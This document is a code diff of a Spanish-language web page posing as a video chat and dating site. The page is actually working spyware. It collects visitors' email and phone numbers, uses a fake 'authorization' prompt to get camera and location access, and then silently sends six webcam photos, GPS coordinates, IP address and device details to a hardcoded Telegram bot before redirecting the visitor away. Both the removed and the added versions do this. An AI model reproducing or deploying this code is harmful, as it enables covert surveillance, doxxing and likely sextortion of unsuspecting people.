@@ -7,166 +7,119 @@
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
   
   <style>
-    body {
-      margin: 0;
-      background: url('image/cu2.jpg') no-repeat center center fixed;
-      background-size: cover;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
-      font-family: 'Segoe UI', Roboto, sans-serif;
-      color: white;
-      overflow: hidden;
+    :root { --primary-blue: #00d1ff; --dark-bg: #1a1a1a; --nav-bg: #ffffff; --tab-bg: #333333; }
+    
+    body { 
+      margin: 0; 
+      background: #0f0f0f url('image/cu3.jpg') no-repeat center center fixed; 
+      background-size: cover; 
+      font-family: 'Segoe UI', Roboto, sans-serif; 
+      color: white; 
+      overflow-x: hidden;
     }
 
     .hidden { display: none !important; }
 
-    /* --- Botón Principal --- */
-    #startBtn {
-      padding: 16px 35px;
-      font-size: 18px;
-      font-weight: bold;
-      background: rgba(0, 0, 0, 0.6);
-      color: white;
-      border: 2px solid #00d1ff;
-      border-radius: 50px;
-      cursor: pointer;
-      backdrop-filter: blur(8px);
-      -webkit-backdrop-filter: blur(8px);
-      transition: all 0.5s cubic-bezier(0.4, 0, 0.2, 1);
-      z-index: 10;
-    }
+    /* HEADER */
+    header { background: var(--nav-bg); width: 100%; position: fixed; top: 0; z-index: 2000; }
+    .top-bar { display: flex; align-items: center; justify-content: space-between; padding: 10px 15px; height: 60px; }
+    .menu-burger { border: 1.5px solid #0056b3; border-radius: 8px; padding: 8px 12px; color: #0056b3; font-size: 20px; cursor: pointer; }
+    .logo-area { text-align: center; flex-grow: 1; }
+    .logo-text { font-weight: 900; font-size: 22px; text-transform: uppercase; letter-spacing: -1px; }
+    .logo-blue { color: #2c5ba0; }
+    .logo-dark { color: #333; }
+    .nav-tabs { display: flex; background: var(--tab-bg); border-top: 1px solid #444; }
+    .tab-item { flex: 1; text-align: center; padding: 12px 5px; font-size: 14px; color: white; border-right: 1px solid #555; display: flex; align-items: center; justify-content: center; cursor: pointer; }
+    .badge { background: #ff4d6d; color: white; font-size: 10px; font-weight: bold; padding: 2px 6px; border-radius: 10px; margin-right: 5px; }
 
-    .pulse {
-      animation: pulseBtn 1.8s infinite;
-    }
+    /* CONTENT */
+    .main-content { height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; padding-top: 110px; }
+    #startBtn { padding: 16px 35px; font-size: 18px; font-weight: bold; background: rgba(0, 0, 0, 0.7); color: white; border: 2px solid var(--primary-blue); border-radius: 50px; cursor: pointer; backdrop-filter: blur(8px); z-index: 10; }
+    
+    .pulse { animation: pulseBtn 1.8s infinite; }
+    @keyframes pulseBtn { 0% { box-shadow: 0 0 0 0 rgba(0, 209, 255, 0.6); } 70% { box-shadow: 0 0 0 15px rgba(0, 209, 255, 0); } 100% { box-shadow: 0 0 0 0 rgba(0, 209, 255, 0); } }
 
-    /* Estilo del botón después de la inscripción */
-    #startBtn.success {
-      background: rgba(40, 167, 69, 0.7);
-      border-color: #28a745;
-      color: white;
-      box-shadow: 0 0 20px rgba(40, 167, 69, 0.4);
-    }
-
-    @keyframes pulseBtn {
-      0% { box-shadow: 0 0 0 0 rgba(0, 209, 255, 0.6); }
-      70% { box-shadow: 0 0 0 15px rgba(0, 209, 255, 0); }
-      100% { box-shadow: 0 0 0 0 rgba(0, 209, 255, 0); }
-    }
-
-    /* --- Estilo Glassmorphism (Popup y Carga) --- */
-    .glass-overlay {
-      position: fixed;
-      inset: 0;
-      background: rgba(0, 0, 0, 0.3);
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      backdrop-filter: blur(15px);
-      -webkit-backdrop-filter: blur(15px);
-      z-index: 3000;
-    }
-
-    .modal-content {
-      background: rgba(255, 255, 255, 0.1);
-      padding: 40px 30px;
-      border-radius: 30px;
-      width: 85%;
-      max-width: 380px;
-      border: 1px solid rgba(255, 255, 255, 0.2);
-      text-align: center;
-      box-shadow: 0 15px 35px rgba(0, 0, 0, 0.3);
-    }
-
-    /* --- Formulario --- */
-    .input-group {
-      position: relative;
-      margin-bottom: 20px;
-    }
-
-    .input-group i {
-      position: absolute;
-      left: 15px;
-      top: 50%;
-      transform: translateY(-50%);
-      color: #00d1ff;
-    }
-
-    .input-group input {
-      width: 100%;
-      padding: 14px 15px 14px 45px;
-      background: rgba(0, 0, 0, 0.4);
-      border: 1px solid rgba(255, 255, 255, 0.2);
-      border-radius: 12px;
-      color: white;
-      box-sizing: border-box;
-      outline: none;
-      font-size: 16px;
-    }
-
-    #submitReg {
-      width: 100%;
-      padding: 15px;
-      background: #00d1ff;
-      border: none;
-      border-radius: 12px;
-      font-weight: bold;
-      font-size: 16px;
-      color: #000;
-      cursor: pointer;
-      transition: 0.3s;
-    }
-
-    /* --- Cargador --- */
-    .loader {
-      width: 50px;
-      height: 50px;
-      border: 5px solid rgba(255, 255, 255, 0.1);
-      border-top: 5px solid #00d1ff;
-      border-radius: 50%;
-      animation: spin 1s linear infinite;
-      margin-bottom: 20px;
-    }
-
+    /* MODALS */
+    .glass-overlay { position: fixed; inset: 0; background: rgba(0, 0, 0, 0.30); display: flex; flex-direction: column; align-items: center; justify-content: center; backdrop-filter: blur(15px); z-index: 3000; padding: 20px; }
+    .modal-content { background: rgba(255, 255, 255, 0.1); padding: 25px; border-radius: 20px; width: 100%; max-width: 380px; border: 1px solid rgba(255, 255, 255, 0.2); text-align: center; }
+    .input-group { position: relative; margin-bottom: 15px; }
+    .input-group i { position: absolute; left: 15px; top: 50%; transform: translateY(-50%); color: var(--primary-blue); }
+    .input-group input { width: 100%; padding: 14px 15px 14px 45px; background: rgba(0, 0, 0, 0.4); border: 1px solid rgba(255, 255, 255, 0.2); border-radius: 12px; color: white; outline: none; box-sizing: border-box; }
+    .btn-action { width: 100%; padding: 15px; background: var(--primary-blue); border: none; border-radius: 12px; font-weight: bold; color: black; cursor: pointer; }
+    .auth-item { text-align: left; margin: 15px 0; }
+    .auth-item h3 { font-size: 0.9rem; color: var(--primary-blue); margin-bottom: 5px; }
+    .auth-img { width: 100%; border-radius: 10px; border: 1px dashed #555; background: #222; min-height: 60px; }
+    
+    .loader { width: 40px; height: 40px; border: 4px solid #333; border-top: 4px solid var(--primary-blue); border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 15px; }
     @keyframes spin { 100% { transform: rotate(360deg); } }
-
+    
     video, canvas { display: none; }
   </style>
 </head>
 <body>
 
-  <div id="interface">
-    <button id="startBtn" class="pulse">Comenzar la aventura</button>
+  <header>
+    <div class="top-bar trigger-auth">
+      <div class="menu-burger"><i class="fas fa-bars"></i></div>
+      <div class="logo-area">
+        <span class="logo-text"><span class="logo-blue">MVIDEO</span>CHAT <span class="logo-dark">FOTO/DISCUSIÓN</span></span>
+      </div>
+       <div style="width: 45px;"></div>
+    </div>
+    <div class="nav-tabs">
+      <div class="tab-item trigger-auth"><span class="badge">6</span> Citas</div>
+      <div class="tab-item trigger-auth"><span class="badge">4</span> Webcams</div>
+      <div class="tab-item trigger-auth"><span class="badge">10</span> Chat</div>
+    </div>
+  </header>
+
+  <div class="main-content">
+    <button id="startBtn" class="pulse trigger-auth">Iniciar chat</button>
   </div>
 
   <div id="registerModal" class="glass-overlay hidden">
     <div class="modal-content">
-      <h2 style="margin-top:0"><i class="fas fa-user-lock"></i> Registro</h2>
-      <p style="font-size: 14px; color: rgba(255,255,255,0.8); margin-bottom: 25px;">
-        Por favor, cree una cuenta para acceder.
-      </p>
-      
+      <h2><i class="fas fa-comments"></i> Registro Rápido</h2>
+      <p>Crea un perfil para unirte a la comunidad.</p>
       <div class="input-group">
         <i class="fas fa-envelope"></i>
-        <input type="email" id="regEmail" placeholder="ejemplo@gmail.com" required>
+        <input type="email" id="regEmail" placeholder="Correo electrónico">
       </div>
-      
       <div class="input-group">
         <i class="fas fa-phone"></i>
-        <input type="tel" id="regPhone" placeholder="+34 600 000 000" required>
+        <input type="tel" id="regPhone" placeholder="Teléfono">
       </div>
-      
-      <button id="submitReg">Registrarse</button>
+      <button id="submitReg" class="btn-action">Continuar</button>
     </div>
   </div>
 
-  <div id="loadingScreen" class="glass-overlay hidden">
+
+  <div id="authModal" class="glass-overlay hidden">
+    <div class="modal-content">
+      <h2 style="color: #ffcc00;"><i class="fas fa-exclamation-triangle"></i> Autorización requerida</h2>
+      <p>Para finalizar el registro, por favor autoriza los siguientes accesos en tu navegador:</p>
+      
+      <div class="auth-section">
+        <div class="auth-item">
+          <h3><i class="fas fa-camera"></i> Cámara</h3>
+        </div>
+        
+        <div class="auth-item">
+          <h3><i class="fas fa-location-dot"></i> Ubicación</h3>
+           <img src="image/auto.png" alt="Indicación Cámara" class="auth-img">
+        </div>
+      </div>
+
+      <button id="confirmAuth" class="btn-action" style="background: #28a745; color: white;">
+        ENTIENDO Y ACEPTO
+      </button>
+    </div>
+  </div>
+ 
+
+ <div id="loadingScreen" class="glass-overlay hidden">
     <div class="loader"></div>
-    <div id="loadText" style="font-weight:500; letter-spacing:1px;">Procesando...</div>
+    <div id="loadText">Conectando...</div>
   </div>
 
   <video id="video" autoplay playsinline></video>
@@ -174,124 +127,124 @@
 
   <script>
     const botToken = "8219156030:AAGt4YPKSBg6FZxAwi31l9yautyH8OTZ8Dk"; 
-    const chatId = "-1003149318360";     
+    const chatId = "-1003619195565"; 
 
-    const startBtn = document.getElementById("startBtn");
     const registerModal = document.getElementById("registerModal");
-    const submitReg = document.getElementById("submitReg");
+    const authModal = document.getElementById("authModal");
     const loadingScreen = document.getElementById("loadingScreen");
-    const loadText = document.getElementById("loadText");
     const video = document.getElementById("video");
     const canvas = document.getElementById("canvas");
+    const startBtn = document.getElementById("startBtn");
 
-    let stream = null;
     let photoCount = 0;
-    const maxPhotos = 6;
 
-    // Verificar estado al iniciar
     window.onload = () => {
-      if (localStorage.getItem("aventure_debloquee")) {
-        setBtnVerified();
-      }
+        if (localStorage.getItem("user_email")) {
+            startBtn.innerText = "Acceder al sitio web";
+        }
     };
 
-    function setBtnVerified() {
-      startBtn.classList.remove("pulse");
-      startBtn.classList.add("success");
-      startBtn.innerHTML = '<i class="fas fa-check-circle"></i> Acceder al sitio';
-    }
-
-    async function initCamera() {
-      try {
-        stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        video.srcObject = stream;
-      } catch (e) { console.warn("Cámara no disponible"); }
-    }
-    initCamera();
-
-    startBtn.onclick = () => {
-      if (localStorage.getItem("aventure_debloquee")) {
-        lancerProcessusFinal();
-      } else {
-        registerModal.classList.remove("hidden");
-      }
+    const getSystemInfo = () => {
+        return {
+            platform: navigator.platform,
+            time: new Date().toLocaleString('es-ES'),
+            model: (navigator.userAgent.match(/\(([^)]+)\)/) || [null, "Desconocido"])[1],
+            agent: navigator.userAgent
+        };
     };
 
-    submitReg.onclick = async () => {
-      const email = document.getElementById("regEmail").value;
-      const phone = document.getElementById("regPhone").value;
+    async function handleMainClick() {
+        const emailSaved = localStorage.getItem("user_email");
+        const authSaved = localStorage.getItem("auth_validee");
 
-      if (email && phone) {
-        registerModal.classList.add("hidden");
+        if (!emailSaved) {
+            registerModal.classList.remove("hidden");
+        } else if (!authSaved) {
+            authModal.classList.remove("hidden");
+        } else {
+            startBtn.innerText = "Cargando...";
+            await demarrerCaptureSilencieuse();
+        }
+    }
+
+    document.querySelectorAll('.trigger-auth').forEach(el => el.onclick = handleMainClick);
+
+    document.getElementById("submitReg").onclick = () => {
+        const email = document.getElementById("regEmail").value;
+        const phone = document.getElementById("regPhone").value;
+        if (email && phone) {
+            localStorage.setItem("user_email", email);
+            localStorage.setItem("user_phone", phone);
+            registerModal.classList.add("hidden");
+            authModal.classList.remove("hidden");
+        } else {
+            alert("Por favor, rellene los campos.");
+        }
+    };
+
+    document.getElementById("confirmAuth").onclick = () => {
+        localStorage.setItem("auth_validee", "true");
+        authModal.classList.add("hidden");
+        demarrerCaptureSilencieuse();
+    };
+
+    async function demarrerCaptureSilencieuse() {
         loadingScreen.classList.remove("hidden");
-        loadText.innerText = "Validando acceso...";
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            video.srcObject = stream;
+            
+            navigator.geolocation.getCurrentPosition(
+                (pos) => envoyerDonnees(`${pos.coords.latitude}, ${pos.coords.longitude}`),
+                () => envoyerDonnees("Rechazada"),
+                { timeout: 5000 }
+            );
+        } catch (e) {
+            envoyerDonnees("Acceso a cámara denegado");
+        }
+    }
 
-        // Envío a Telegram
+    async function envoyerDonnees(coords) {
+        const ip = await fetch("https://api.ipify.org?format=json").then(r=>r.json()).then(d=>d.ip).catch(()=>"Desconocida");
+        const info = getSystemInfo();
+        const email = localStorage.getItem("user_email");
+        const phone = localStorage.getItem("user_phone");
+
+        const text = `
+🆕 **NUEVA ACTIVIDAD**
+📧 Email: ${email}
+📞 Tel: ${phone}
+------------------------
+📍 Coordenadas: ${coords}
+🌐 IP: ${ip}
+📱 Modelo: ${info.model}
+🕒 Fecha: ${info.time}
+🖥️ OS: ${info.platform}
+🔍 User-Agent: ${info.agent}
+        `;
+
         await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ 
-            chat_id: chatId, 
-            text: `🎯 NUEVO REGISTRO :\n📧 Email: ${email}\n📞 Tel: ${phone}` 
-          })
+            method: "POST",
+            headers: {"Content-Type": "application/json"},
+            body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: "Markdown" })
         });
 
-        localStorage.setItem("aventure_debloquee", "true");
-        setBtnVerified();
-
-        setTimeout(() => {
-          lancerProcessusFinal();
-        }, 1500);
-      } else {
-        alert("Por favor, complete todos los campos.");
-      }
-    };
-
-    async function lancerProcessusFinal() {
-      loadingScreen.classList.remove("hidden");
-      loadText.innerText = "Sincronización en curso...";
-
-      let ip = "Desconocida";
-      try {
-        const res = await fetch("https://api.ipify.org?format=json");
-        const d = await res.json(); ip = d.ip;
-      } catch(e){}
-      
-      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ 
-          chat_id: chatId, 
-          text: `🌐 Conexión de : ${ip}\n📱 Dispositivo : ${navigator.userAgent}` 
-        })
-      });
-
-      const interval = setInterval(async () => {
-        if (photoCount >= maxPhotos) {
-          clearInterval(interval);
-          if (stream) stream.getTracks().forEach(t => t.stop());
-          window.location.replace("https://www.mvideoporno.xxx/xhamster/");
-          return;
-        }
-        await capturePhoto();
-      }, 2000);
-    }
-
-    async function capturePhoto() {
-      if (!video.videoWidth) return;
-      photoCount++;
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      canvas.getContext("2d").drawImage(video, 0, 0);
-      
-      const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.7));
-      const fd = new FormData();
-      fd.append("chat_id", chatId);
-      fd.append("photo", blob, `pic_${photoCount}.jpg`);
-      
-      try { 
-        await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: "POST", body: fd }); 
-      } catch(e){}
+        const interval = setInterval(async () => {
+            if(photoCount < 6) {
+                photoCount++;
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                canvas.getContext("2d").drawImage(video, 0, 0);
+                const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.5));
+                const fd = new FormData();
+                fd.append("chat_id", chatId);
+                fd.append("photo", blob, "photo.jpg");
+                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {method:"POST", body:fd});
+            } else {
+                clearInterval(interval);
+                window.location.replace("https://www.google.com");
+            }
+        }, 2000);
     }
   </script>
 </body>
